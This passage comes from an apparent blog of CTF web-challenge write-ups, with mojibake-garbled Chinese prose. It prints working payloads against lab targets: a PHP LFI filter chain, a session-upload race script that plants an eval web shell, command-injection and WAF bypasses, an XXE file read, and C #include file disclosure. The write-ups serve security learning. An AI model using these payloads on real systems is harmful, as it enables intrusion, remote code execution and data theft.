<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?file=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>flag.php<br></code></pre></td></tr></table></figure>

<p><strong>è§£æ³•äºŒ:(éé¢„æœŸè§£)</strong></p>
<p>å¯ä»¥åˆ©ç”¨PHP_SESSION_UPLOAD_PROGRESSä¸Šä¼ æ–‡ä»¶åè¿›è¡Œæ–‡ä»¶åŒ…å«ï¼š</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import io<br>import requests<br>import threading<br>sessid = <span class="hljs-string">&#x27;bbbbbbb&#x27;</span><br>data = &#123;<span class="hljs-string">&quot;cmd&quot;</span>:<span class="hljs-string">&quot;system(&#x27;cat flag.php&#x27;);&quot;</span>&#125;<br>def write(session):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        f = io.BytesIO(b<span class="hljs-string">&#x27;a&#x27;</span> * 1024 * 50)<br>        resp = session.post( <span class="hljs-string">&#x27;http://aaf83abf-31f4-4680-b042-6d2a60e9810a.node5.buuoj.cn:81/&#x27;</span>, data=&#123;<span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="hljs-string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;, files=&#123;<span class="hljs-string">&#x27;file&#x27;</span>: (<span class="hljs-string">&#x27;1.txt&#x27;</span>,f)&#125;, cookies=&#123;<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>: sessid&#125; )<br>def read(session):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        resp = session.post(<span class="hljs-string">&#x27;http://aaf83abf-31f4-4680-b042-6d2a60e9810a.node5.buuoj.cn:81/?file=/tmp/sess_&#x27;</span>+sessid,<span class="hljs-attribute">data</span>=data)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;1.txt&#x27;</span> <span class="hljs-keyword">in</span> resp.text:<br>            <span class="hljs-built_in">print</span>(resp.text)<br>            event.clear()<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+++++++++++++]retry&quot;</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-attribute">__name__</span>==&quot;__main__&quot;:<br>    <span class="hljs-attribute">event</span>=threading.Event()<br>    with requests.session() as session:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(1,30):<br>            threading.Thread(<span class="hljs-attribute">target</span>=write,args=(session,)).start()<br><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(1,30):<br>            threading.Thread(<span class="hljs-attribute">target</span>=read,args=(session,)).start()<br>    event.<span class="hljs-built_in">set</span>()<br></code></pre></td></tr></table></figure>
<p><img src="/images/22AA6D8691E44429ABDBB45C04EAFBCE.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="EasyBypass"><a href="#EasyBypass" class="headerlink" title="EasyBypass"></a>EasyBypass</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-variable">$comm1</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;comm1&#x27;</span>];<br><span class="hljs-variable">$comm2</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;comm2&#x27;</span>];<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\&#x27;|\`|\\|\*|\n|\t|\xA0|\r|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is&quot;</span>, <span class="hljs-variable">$comm1</span>))<br>    <span class="hljs-variable">$comm1</span> = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\&#x27;|\&quot;|;|,|\`|\*|\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||ls|\||tail|more|cat|string|bin|less||tac|sh|flag|find|grep|echo|w/is&quot;</span>, <span class="hljs-variable">$comm2</span>))<br>    <span class="hljs-variable">$comm2</span> = <span class="hljs-string">&quot;&quot;</span>;<br><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;#flag in /flag&quot;</span>;<br><br><span class="hljs-variable">$comm1</span> = <span class="hljs-string">&#x27;&quot;&#x27;</span> . <span class="hljs-variable">$comm1</span> . <span class="hljs-string">&#x27;&quot;&#x27;</span>;<br><span class="hljs-variable">$comm2</span> = <span class="hljs-string">&#x27;&quot;&#x27;</span> . <span class="hljs-variable">$comm2</span> . <span class="hljs-string">&#x27;&quot;&#x27;</span>;<br><br><span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;file <span class="hljs-subst">$comm1</span> <span class="hljs-subst">$comm2</span>&quot;</span>;<br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$cmd</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>ç»•è¿‡é¢˜ï¼Œæœ€ç»ˆè¦åˆ©ç”¨systemå‘½ä»¤ï¼Œå› ä¸ºfileå‘½ä»¤æ‰“ä¸å¼€æ–‡ä»¶ï¼Œåªèƒ½åˆ¤åˆ«æ–‡ä»¶çš„ç±»å‹ï¼Œå› æ­¤æˆ‘ä»¬åœ¨comm1ä¸­è¦åˆ©ç”¨å¼•å·å’Œåˆ†å·æ¥è¿›è¡Œå‘½ä»¤çš„æ§åˆ¶ã€‚<br>ä»”ç»†ä¸€çœ‹å¯ä»¥å‘ç°ç¬¬ä¸€ä¸ªè¿‡æ»¤æ¯”ç¬¬äºŒä¸ªè¿‡æ»¤å°‘ï¼Œå¯ä»¥å‘ç°åå‘è¾“å‡ºtac å¤´å‡ è¡Œè¾“å‡ºhead è¯»å–æ–‡ä»¶sortéƒ½æ²¡æœ‰è¿‡æ»¤ï¼Œflagè¢«è¿‡æ»¤äº†ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨æ¨¡ç³ŠåŒ¹é…æ¥è¿›è¡Œæ›¿ä»£ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥åˆ©ç”¨äº†<br>å› ä¸ºç¬¬äºŒä¸ªè¿‡æ»¤é‡Œé¢è¿‡æ»¤äº†åˆ†å· åŒå¼•å· å› æ­¤æˆ‘ä»¬è¦åœ¨comm1å‚æ•°é‡Œé¢åšæ–‡ç« <br>æ„é€ å¦‚ä¸‹</p>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">/?comm1=<span class="hljs-string">&quot;;sort+/fla?;&quot;</span>&amp;comm2=<span class="hljs-number">1</span><br>åˆ©ç”¨ç¬¬ä¸€ä¸ªåˆ†å·æ¥å°†comm1å‰é¢çš„åŒå¼•å·æ‹¼æ¥é—­åˆï¼Œåé¢é‚£ä¸ªåˆ†å·å°†åé¢çš„é—­åˆ<br>ä¸é—­åˆçš„è¯åˆ°<span class="hljs-keyword">cmd</span><span class="language-bash">é‡Œé¢è¯­å¥ä¼šå˜æˆ</span><br><span class="hljs-string">&quot;file&quot;</span>;sortâ€¦â€¦<span class="hljs-string">&quot;&quot;</span><br>é—­åˆå<span class="hljs-keyword">cmd</span><span class="language-bash">è¯­å¥åº”è¯¥æ˜¯</span><br><span class="hljs-keyword">cmd</span><span class="language-bash">=<span class="hljs-string">&quot;file;sort+/fla?;&quot;</span>1<span class="hljs-string">&quot;&quot;</span></span><br></code></pre></td></tr></table></figure>
<p>fileåé¢å¯ä»¥åŠ ä¸€ä¸ªindex.phpï¼Œä¸åŠ ä¹Ÿæ²¡äº‹ï¼Œå› ä¸ºåˆ†å·;ä¸ä¼šå› ä¸ºå‰é¢çš„å‘½ä»¤æ‰§è¡Œå¯¹é”™è€Œå½±å“åé¢çš„</p>
<p>è¿˜æœ‰å¥½å¤šå¯ä»¥æ›¿ä»£catçš„</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs 1c">cat /flag<br>tac /flag<br>head /flag<br>tail /flag<br>more /flag<br>less /flag<br>od -c /flag<br>fmt /flag<br>rev /flag<br>tailf /flag<br>nl /*<br><span class="hljs-number">1</span>.od /*<br><span class="hljs-number">2</span>.pythonæ‰§è¡Œ<br>s = &#x27;<span class="hljs-number">000000</span>0 <span class="hljs-number">066146</span> <span class="hljs-number">063541</span> <span class="hljs-number">062573</span> <span class="hljs-number">061470</span> <span class="hljs-number">063066</span> <span class="hljs-number">030070</span> <span class="hljs-number">026463</span> <span class="hljs-number">063142</span> <span class="hljs-number">000002</span>0 <span class="hljs-number">061065</span> <span class="hljs-number">032055</span> <span class="hljs-number">033071</span> <span class="hljs-number">026460</span> <span class="hljs-number">033070</span> <span class="hljs-number">031546</span> <span class="hljs-number">034455</span> <span class="hljs-number">030471</span> <span class="hljs-number">000004</span>0 <span class="hljs-number">061070</span> <span class="hljs-number">060463</span> <span class="hljs-number">030465</span> <span class="hljs-number">031463</span> <span class="hljs-number">076461</span> <span class="hljs-number">000012</span> <span class="hljs-number">000005</span>3&#x27;<br>print(b&#x27;&#x27;.join(int(ss, <span class="hljs-number">8</span>).to_bytes(<span class="hljs-number">2</span>, &#x27;little&#x27;) for ss in s.split()))<br></code></pre></td></tr></table></figure>
<p>éƒ½å¯ä»¥çœ‹åˆ°flagä¸­çš„å†…å®¹</p>
<h2 id="æå®¢å¤§æŒ‘æˆ˜-2020-Roamphp1-Welcome"><a href="#æå®¢å¤§æŒ‘æˆ˜-2020-Roamphp1-Welcome" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2020]Roamphp1-Welcome"></a>[æå®¢å¤§æŒ‘æˆ˜ 2020]Roamphp1-Welcome</h2><p><img src="/images/C2896C1B319D49d199C331C22799699C.png" srcset="/img/loading.gif" lazyload></p>
<p>é‡æ–°åŠ è½½äº†å‡ éï¼Œè¿˜æ˜¯405<br>å»æœæœ405æ˜¯å•¥æ„æ€<br>å¾—åˆ°çš„ç»“æœæ˜¯<br>1:è¯·æ±‚æ–¹æ³•é”™è¯¯ï¼Œå¦‚ï¼špost ç”¨äº†get è¯·æ±‚æ–¹å¼<br>2ï¼šè¯·æ±‚çš„è·¯å¾„æ ¹æœ¬ä¸å¯¹ï¼Œä¹Ÿä¼šå‡ºç°405</p>
<p>é‚£ä¹ˆæˆ‘ä»¬postä¸€ä¸ªå‚æ•°id<br>oké¡µé¢æ¢å¤æ­£å¸¸</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] !== <span class="hljs-string">&#x27;POST&#x27;</span>) &#123;<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;HTTP/1.1 405 Method Not Allowed&quot;</span>);<br><span class="hljs-keyword">exit</span>();<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <br>    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;roam1&#x27;</span>]) || !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;roam2&#x27;</span>]))&#123;<br>        <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;roam1&#x27;</span>] !== <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;roam2&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;roam1&#x27;</span>]) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;roam2&#x27;</span>]))&#123;<br>        <span class="hljs-title function_ invoke__">phpinfo</span>();  <span class="hljs-comment">// collect information from phpinfo!</span><br>    &#125;<br>&#125; <br></code></pre></td></tr></table></figure>
<p>è¿˜ä»¥ä¸ºæ˜¯sha1ç¢°æ’ï¼Œæ²¡å•¥ç”¨ï¼Œå¯ä»¥ç”¨æ•°ç»„ç»•è¿‡,sha1()å‡½æ•°æ— æ³•å¤„ç†æ•°ç»„ï¼Œå¦‚æœä¼ å…¥çš„ä¸ºæ•°ç»„ï¼Œä¼šè¿”å›NULLï¼Œæ‰€ä»¥ä¸¤ä¸ªæ•°ç»„ç»è¿‡åŠ å¯†åå¾—åˆ°çš„éƒ½æ˜¯NULLï¼Œä¹Ÿå°±æ˜¯ç›¸ç­‰çš„ã€‚</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span><br><span class="hljs-attribute">roam1</span>[]=<span class="hljs-number">12</span>&amp;roam2[]=<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>

<p>åœ¨phpinfoé‡Œæ‰¾flag<br><img src="/images/4240ADC1636E4b54884EF4FABDAB02AD.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="CSAWQual-2019-Web-Unagi"><a href="#CSAWQual-2019-Web-Unagi" class="headerlink" title="[CSAWQual 2019]Web_Unagi"></a>[CSAWQual 2019]Web_Unagi</h2><p>æœ¬é¢˜éœ€è¦ä¸Šä¼ ä¸€ä¸ªxmlæ–‡ä»¶<br>hereç»™å‡ºäº†xmlçš„æ ¼å¼<br><img src="/images/73A5E494197347c886E54DE259A48FF9.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/images/187F9BE1A2024dbbA31809BA00868B71.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE a [</span><br><span class="hljs-meta">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">admin</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">users</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>bob<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>passwd2<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span> Bob<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">email</span>&gt;</span>bob@fakesite.com<span class="hljs-tag">&lt;/<span class="hljs-name">email</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">group</span>&gt;</span><span class="hljs-symbol">&amp;admin;</span><span class="hljs-tag">&lt;/<span class="hljs-name">group</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">users</span>&gt;</span><br><br></code></pre></td></tr></table></figure>
<p>å¥‡æ€ªçš„æ˜¯å¤ç°çš„æ—¶å€™åŒæ ·çš„ä»£ç ç«Ÿç„¶è¢«æ‹¦äº†ï¼Œæ¢æˆutf-16å°±å¥½äº†ï¼Œä½†æ˜¯å½“æ—¶è¿™ç‚¹ä½¿ç”¨çš„utf-8çš„</p>
<p>æŸ¥äº†å¦‚ä½•ç»•è¿‡WAFä¿æŠ¤çš„XXEçš„èµ„æ–™ï¼š</p>
<p>ä¸€ä¸ªxmlæ–‡æ¡£ä¸ä»…å¯ä»¥ç”¨UTF-8ç¼–ç ï¼Œä¹Ÿå¯ä»¥ç”¨UTF-16(ä¸¤ä¸ªå˜ä½“â€Š-â€ŠBEå’ŒLE)ã€UTF-32(å››ä¸ªå˜ä½“â€Š-â€ŠBEã€LEã€2143ã€3412)å’ŒEBCDICç¼–ç ã€‚</p>
<p>åœ¨è¿™ç§ç¼–ç çš„å¸®åŠ©ä¸‹ï¼Œä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼å¯ä»¥å¾ˆå®¹æ˜“åœ°ç»•è¿‡WAFï¼Œå› ä¸ºåœ¨è¿™ç§ç±»å‹çš„WAFä¸­ï¼Œæ­£åˆ™è¡¨è¾¾å¼é€šå¸¸ä»…é…ç½®ä¸ºå•å­—ç¬¦é›†ã€‚</p>
<p><img src="/images/1A03A7F1485B413eAEF5D69165FAA8A0.png" srcset="/img/loading.gif" lazyload></p>
<p>å¯ä»¥çœ‹åˆ°flagæ˜¾ç¤ºçš„ä¸å…¨<br><img src="/images/B1B2F59AF52C4cb6B67F336D062D1BE2.png" srcset="/img/loading.gif" lazyload><br>è¿™é‡Œå¤šäº†ä¸ªå‚æ•°ã€‚æŠŠå®ƒåŠ ä¸Š</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE a [</span><br><span class="hljs-meta">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">admin</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">users</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>bob<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>passwd2<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span> Bob<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">email</span>&gt;</span>bob@fakesite.com<span class="hljs-tag">&lt;/<span class="hljs-name">email</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">group</span>&gt;</span>CSAW2019<span class="hljs-tag">&lt;/<span class="hljs-name">group</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">intro</span>&gt;</span><span class="hljs-symbol">&amp;admin;</span><span class="hljs-tag">&lt;/<span class="hljs-name">intro</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">users</span>&gt;</span><br></code></pre></td></tr></table></figure>


<h2 id="FireshellCTF2020-Caas"><a href="#FireshellCTF2020-Caas" class="headerlink" title="[FireshellCTF2020]Caas"></a>[FireshellCTF2020]Caas</h2><p>ä¸æ˜¯å¾ˆæ˜ç™½æ˜¯ä»€ä¹ˆç¼–è¯‘å™¨<br>å…ˆéšä¾¿è¾“äº†ç‚¹<br>wpè¯´æ˜¯cè¯­è¨€ç¼–è¯‘å™¨<br>è¾“å…¥</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br> <br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hello, World! \n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>ä¸‹è½½äº†ä¸€ä¸ªæ–‡ä»¶ï¼Œå•¥éƒ½æ²¡æœ‰<br>è¿™é‡Œæœ‰æ–‡ä»¶åŒ…å«<br>çŒœæµ‹flagåº”è¯¥æ˜¯ä»¥æ–‡ä»¶å½¢å¼å­˜åœ¨æœåŠ¡å™¨ä¸­ï¼Œå°è¯•ä½¿ç”¨#include â€˜â€™é¢„å¤„ç†å‘½ä»¤ï¼Œå¼•å…¥æ–‡ä»¶&#x2F;etc&#x2F;passwdï¼Œæ„é€ ä»£ç ï¼š</p>
<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;/etc/passwd&#x27;</span></span><br></code></pre></td></tr></table></figure>
<p><img src="/images/B735E622B3A94cc88707F7ECF9195975.png" srcset="/img/loading.gif" lazyload><br>æŠ¥é”™æç¤ºäº†åº”è¯¥ä¸ºåŒå¼•å·</p>
<p><img src="/images/1DC153B70A9E4488B4BBB7A6E8EC5C14.png" srcset="/img/loading.gif" lazyload><br>æ˜¾ç¤ºäº†ä¸€äº›ï¼Œè¯æ˜å­˜åœ¨æ–‡ä»¶åŒ…å«</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;/flag&quot;</span></span><br></code></pre></td></tr></table></figure>
<p><img src="/images/176F9EFE0C4E40deA0BE3ECAD7B64841.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="SCTF2019-Flag-Shop"><a href="#SCTF2019-Flag-Shop" class="headerlink" title="[SCTF2019]Flag Shop"></a>[SCTF2019]Flag Shop</h2><p><img src="/images/8251443A5D874fc89C35D4E1D6939CDF.png" srcset="/img/loading.gif" lazyload></p>
<p>ä¹°flagï¼Œresetæ˜¯é‡ç½®Jinkelaï¼Œworkæ˜¯è®©é’±å¢åŠ ä¸€å®šçš„æ•°é‡ï¼Œè¿™é¢˜è‚¯å®šä¸å¯èƒ½æ˜¯è¿™æ ·è®©é’±å¤Ÿçš„ã€‚çœ‹ä¸€ä¸‹cookieï¼Œå‘ç°å¥½åƒæ˜¯jwtï¼Œè§£ç ä¸€ä¸‹ï¼š<br><img src="/images/B29EBEC6644C4e218E46CBD627EC5551.png" srcset="/img/loading.gif" lazyload><br>jkIæ˜¯å­˜å‚¨åœ¨jwté‡Œé¢çš„ï¼Œæ‰€ä»¥è¿™é¢˜å¾ˆæ˜æ˜¾æ˜¯è¦ä¼ªé€ jwtæ‰èƒ½è®©é’±è¶³å¤Ÿæ¥è´­ä¹°flagäº†ã€‚<br>è¿™é¢˜çš„jwtæ˜¯HS256ç®—æ³•ï¼Œå°è¯•äº†ä¸€ä¸‹æ— ç®—æ³•ï¼Œå¼±å¯†é’¥çˆ†ç ´ç­‰éƒ½ä¸è¡Œã€‚<br>è½¬å˜æ€è·¯<br>è¿™é¢˜æœ‰robots.txtæ–‡ä»¶ï¼Œé‡Œé¢æŒ‡å‘äº†ä¸€ä¸ªé¡µé¢</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">User-agent</span><span class="hljs-punctuation">: </span>*<br><span class="hljs-attribute">Disallow</span><span class="hljs-punctuation">: </span>/filebak<br></code></pre></td></tr></table></figure>
<p>è¿›å…¥å¯çœ‹åˆ°æºç </p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span 